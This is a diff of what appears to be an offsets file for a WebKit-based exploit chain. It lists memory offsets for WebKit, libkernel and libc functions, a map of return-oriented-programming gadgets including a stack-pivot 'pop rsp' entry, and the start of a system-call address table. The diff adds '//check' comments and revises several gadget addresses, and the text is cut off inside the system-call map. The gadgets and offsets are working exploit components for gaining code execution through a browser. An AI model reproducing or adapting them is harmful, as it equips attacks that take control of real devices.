@@ -1,49 +1,50 @@
-const OFFSET_wk_vtable_first_element     = 0x00314880;
-const OFFSET_wk_memset_import            = 0x028DDEB8;
-const OFFSET_wk___stack_chk_guard_import = 0x028DDB98;
+const OFFSET_wk_vtable_first_element     = 0x00314880; //check
+const OFFSET_wk_memset_import            = 0x028DDEB8; //check
+const OFFSET_wk___stack_chk_guard_import = 0x028DDB98; //check
 
-const OFFSET_lk___stack_chk_guard        = 0x00069190;
-const OFFSET_lk_pthread_create_name_np   = 0x0002CED0;
-const OFFSET_lk_pthread_join             = 0x0002F460;
-const OFFSET_lk_pthread_exit             = 0x00020A80;
-const OFFSET_lk__thread_list             = 0x000601A8;
+const OFFSET_lk___stack_chk_guard        = 0x00069190; //check
+const OFFSET_lk_pthread_create_name_np   = 0x0002CED0; //check
+const OFFSET_lk_pthread_join             = 0x0002F460; //check
+const OFFSET_lk_pthread_exit             = 0x00020A80; //check
+const OFFSET_lk__thread_list             = 0x000601A8; //check
 
-const OFFSET_lc_memset                   = 0x00014B50;
-const OFFSET_lc_setjmp                   = 0x0005F940;
-const OFFSET_lc_longjmp                  = 0x0005F990;
+const OFFSET_lc_memset                   = 0x00014B50; //check
+const OFFSET_lc_setjmp                   = 0x0005F940; //check
+const OFFSET_lc_longjmp                  = 0x0005F990; //check
 
-const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88;
+const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88; //check
 
 let wk_gadgetmap = {
-    "ret"    : 0x00000042,
-    "pop rdi": 0x00107342,
-    "pop rsi": 0x00115923,
-    "pop rdx": 0x002FFDF2,
-    "pop rcx": 0x0009AC92,
-    "pop r8": 0x0024A59F,
-    "pop r9" : 0x00277B41,
-    "pop rax": 0x0002C827,
-    "pop rsp": 0x00099A22,
+    "ret"    : 0x00000042, //check
+    "pop rdi": 0x00107342, //check
+    "pop rsi": 0x00115923, //check
+    "pop rdx": 0x002FFDF2, //check
+    "pop rcx": 0x0009AC92, //check
+    "pop r8": 0x0024A59F, //check
+    "pop r9" : 0x00277B41, //check
+    "pop rax": 0x0002C827, //check
+    "pop rsp": 0x00099A22, //check
 
-    "mov [rdi], rsi": 0x00A2D5B8,
-    "mov [rdi], rax": 0x0003A79A,
-    "mov [rdi], eax": 0x0003A79B,
+    "mov [rdi], rsi": 0x00A2D658, //check
+    "mov [rdi], rax": 0x0003A79A, //check
+    "mov [rdi], eax": 0x0003A79B, //check
 
-    "infloop": 0x00007351,
+    "infloop": 0x00007351, //check
 
     //branching specific gadgets
-    "cmp [rcx], eax" : 0x00E4EEDB,
-    "sete al"        : 0x00022549,
-    "seta al"        : 0x0000C94F,
-    "setb al"        : 0x0015E348,
-    "setg al"        : 0x002F89AA,
-    "setl al"        : 0x000E0D91,
-    "shl rax, 3"     : 0x01A26823,
-    "add rax, rdx"   : 0x016D53B2,
-    "mov rax, [rax]" : 0x00047FEC,
-    "inc dword [rax]": 0x004971AA,
+    "cmp [rcx], eax" : 0x00E4EF7B, //check
+    "sete al"        : 0x00022549, //check
+    "seta al"        : 0x0000C94F, //check
+    "setb al"        : 0x0015E348, //check
+    "setg al"        : 0x002F89AA, //check
+    "setl al"        : 0x000E0D91, //check
+    "shl rax, 3"     : 0x01A269F3, //check
+    "add rax, rdx"   : 0x016D5582, //check
+    "mov rax, [rax]" : 0x00047FEC, //check
+    "inc dword [rax]": 0x004971AA, //check
 };
 
+//check
 let syscall_map = {
     0x001: 0x33B80, // sys_exit
     0x002: 0x34B30, // sys_fork
